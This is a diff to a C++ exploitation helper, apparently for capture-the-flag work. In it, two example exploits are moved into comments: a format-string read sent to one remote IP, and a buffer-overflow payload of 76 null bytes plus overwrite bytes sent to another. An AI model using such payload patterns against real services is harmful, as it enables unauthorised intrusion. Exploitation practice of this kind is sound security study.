@@ -19,18 +19,32 @@ int main() {
 
 	//TODO list:
 	//1/  
-	FSBuilder aa; aa.read(18, type::LNG);
-	RemoteSession a = remote("111.230.240.83", 2333);
-	a.recv();
-	a.sendline(aa.result());
-	int aasdfasd = 2;
-	while (aasdfasd--) {
-		Sleep(200);
-		string temp = a.recv();
-		int faa = 0;
-		while (!isdigit(temp[faa]))faa++;
-		sscanf(temp.substr(faa).c_str(), "%d", &faa);
-		a.sendline(to_string(faa));
-	}
-	cout << a.recv();
+
+	//this is an example:
+	//FSBuilder aa; aa.read(18, type::LNG);
+	//RemoteSession a = remote("111.230.240.83", 2333);
+	//a.recv();
+	//a.sendline(aa.result());
+	//int aasdfasd = 2;
+	//while (aasdfasd--) {
+	//	Sleep(200);
+	//	string temp = a.recv();
+	//	int faa = 0;
+	//	while (!isdigit(temp[faa]))faa++;
+	//	sscanf(temp.substr(faa).c_str(), "%d", &faa);
+	//	a.sendline(to_string(faa));
+	//}
+	//cout << a.recv();
+
+	//this is another example:
+	//string afds;
+	//string a = "";
+	//for (int j = 0; j < 76; j++)a += '\0';
+	//a += char(134); a += char(7);//00000111(7) 10000110(134)
+	//RemoteSession ses = remote("123.56.218.81", 9999);
+	//ses.recv();
+	//ses.sendline(a);
+	//Sleep(200);
+	//afds = ses.recv();
+	//cout << afds;
 }
